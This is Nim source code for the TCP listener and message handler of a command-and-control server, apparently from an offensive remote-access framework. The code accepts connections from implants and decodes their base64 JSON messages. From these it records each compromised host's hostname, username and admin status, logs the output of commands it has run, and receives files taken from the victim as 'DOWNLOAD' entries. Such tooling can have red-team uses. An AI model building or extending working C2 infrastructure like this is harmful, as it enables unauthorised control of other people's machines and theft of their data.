import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64

import ../types, ../logging, ../communication

proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {.async.} =
  while true:
    let line = await tcpSocket.socket.recvLine()

    if line.len == 0:
      client.connected = false
      tcpSocket.socket.close()
      cDisconnected(client)  
      return
      
    let response = parseJson(decode(line))

    let error = response["error"].getStr() 
    let taskId = response["taskId"].getInt() 

    if taskId > -1:
      let task = server.tasks[taskId]
      task.markAsCompleted(response)
      if error != "":
        errorLog $client & ": " & error
      else: 
        case response["task"].getStr():
          of "identify":
            server.clients[client.id].loaded = true
            server.clients[client.id].hostname = response["data"]["hostname"].getStr()
            server.clients[client.id].username = response["data"]["username"].getStr()
            server.clients[client.id].isAdmin = response["data"]["isAdmin"].getBool()
          of "output":
            let output = response["data"]["output"].getStr()
            let category = response["data"]["category"].getStr()
            if output != "":
              logClientOutput client, category, output
          of "file":
              infoLog "received file " & response["data"]["path"].getStr() & " from " & $client
              logClientOutput client, "DOWNLOAD", response["data"]["contents"].getStr()
    else:
      await client.askToIdentify()
          
        
proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
  let id = len(server.tcpListeners)
  server.tcpListeners.add(
    TCPListener(
      sockets: @[], 
      port: port,
      listeningIP: ip,
      id: id, 
      socket: newAsyncSocket(),
      running: true
    )
  )
  let tcpServer = server.tcpListeners[id]
  tcpServer.socket.bindAddr(port.Port, ip)
  tcpServer.socket.listen()
  
  infoLog "listening on " & tcpServer.listeningIP & ":" & $tcpServer.port
  
  while tcpServer.running:
    let 
      (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
      client = C2Client(
        listenerType: "tcp",
        listenerId: id,
        id: server.clients.len,
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server
      )
      tcpSocket = TCPSocket(
        socket: clientSocket,
        id: client.id,
        netAddr: netAddr
      )

    server.clients.add(client)
    tcpServer.sockets.add(tcpSocket)

    cConnected(client)
    asyncCheck processMessages(server, tcpSocket, client)

  infoLog $tcpServer & " stopped"